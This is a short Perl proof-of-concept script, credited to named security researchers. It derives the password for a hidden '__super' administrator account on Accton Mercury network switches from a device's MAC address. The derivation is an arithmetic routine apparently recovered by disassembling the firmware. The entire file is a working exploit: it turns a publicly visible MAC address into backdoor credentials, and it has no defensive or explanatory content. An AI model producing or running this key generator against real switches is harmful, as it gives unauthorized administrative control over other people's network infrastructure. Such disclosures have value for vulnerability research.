#!/usr/bin/perl -w
use strict;
 
# Accton Mercury "__super" user proof of concept
# Disassembling and first PoC - smite@zylon.net.
# Disassembling and math - psy@datux.nl, gido@datux.nl
 
my $counter;
my $char;
 
my $mac = $ARGV[0];
my @mac;
 
foreach my $octet (split (":", $mac)) {
  push @mac, hex($octet);
}
 
if (!defined $mac[5]) {
    print "Usage: ./accton.pl 00:01:02:03:04:05\n";
    exit 1;
}
 
sub printchar {
    my ($char) = @_;
 
    $char = $char % 0x4b;
     
    if ($char <= 9 || ($char > 0x10 && $char < 0x2a) || $char > 0x30) {
        print pack("c*", $char+0x30);
    } else {
        print "!";
    }
}
 
 
for ($counter=0;$counter<5;$counter++) {
    $char = $mac[$counter];
    $char = $char + $mac[$counter+1];
    printchar($char);
}
 
for ($counter=0;$counter<3;$counter++) {
    $char = $mac[$counter];
    $char = $char + $mac[$counter+1];
    $char = $char +  0xF;
    printchar($char);
}
 
print "\n";